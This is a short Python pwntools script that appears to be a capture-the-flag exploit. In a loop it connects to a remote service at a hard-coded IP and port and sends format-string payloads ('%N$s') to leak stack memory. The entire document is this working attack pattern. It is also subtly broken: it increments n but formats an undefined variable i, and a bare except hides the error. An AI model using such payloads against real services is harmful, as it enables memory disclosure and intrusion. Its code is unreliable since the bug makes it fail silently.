from pwn import *
import sys

n = 1
context.log_level = 'error'
while 1:
    try:
        r = remote('89.38.210.128', 31339)
        r.recvuntil("? > ")
        r.sendline(f"%{str(i)}$s")
        r.recvline()
        r.sendline("42")
        r.recvline()
        r.sendline("77")
        r.recvline()
        r.sendline("111")
        r.recvline()
        sys.stdout.write(r.recvline())
        r.close()
        n += 1
    except:
            pass
